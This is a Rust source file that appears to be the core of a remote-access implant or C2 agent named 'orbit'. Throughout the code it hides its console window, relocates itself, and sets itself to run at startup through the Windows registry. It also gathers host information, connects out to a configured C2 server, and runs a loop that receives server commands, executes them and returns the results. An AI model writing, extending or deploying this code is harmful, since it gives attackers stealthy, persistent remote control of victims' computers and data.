pub mod actions;
pub mod agent;
pub mod config;
pub mod debug;
pub mod utils;
pub mod sockets;

use actions::command::Command;
use agent::info::Info;
use sockets::ServerStream;
use std::error::Error;

pub fn setup() {
    // hide process' console window if in release
    #[cfg(not(debug_assertions))]
    utils::process::hide_console_window();

    // make sure the agent is running in the correct path
    if !utils::filesystem::check_desired_dir() {
        utils::filesystem::move_to_desired_dir();
    }
    // use windows registry to set the agent to run at startup
    utils::registry::add_to_startup();
}

pub fn run() -> Result<(), Box<dyn Error>> {
    // gathering host system's initial information
    let agent_info = Info::collect();
    let agent_info = agent_info.as_string();

    orbit_debug!("Gathered Machine's Info:\n{}", agent_info);

    // create a session with C2 server and send initial data
    let mut server_stream = ServerStream::new(config::server::IP, config::server::PORT)?;
    server_stream.send(agent_info)?;

    orbit_debug!("Connected to C2 Server!");

    // starting the main C&C loop
    loop {
        orbit_debug!("Waiting for a command from the server...");
        
        // get a command from the server
        let (server_command, command_size) = server_stream.receive()?;

        // parsing command to a string
        let server_command = server_command.get(..command_size).unwrap();
        let server_command = String::from_utf8(server_command.to_vec())?;

        orbit_debug!("Server Command: {}", server_command);

        // build the command object and execute it
        let command = Command::from_server(server_command);
        let result = command.execute()?;

        orbit_debug!("Command Executed");

        // send result back to the server
        server_stream.send(result)?;
    }
}
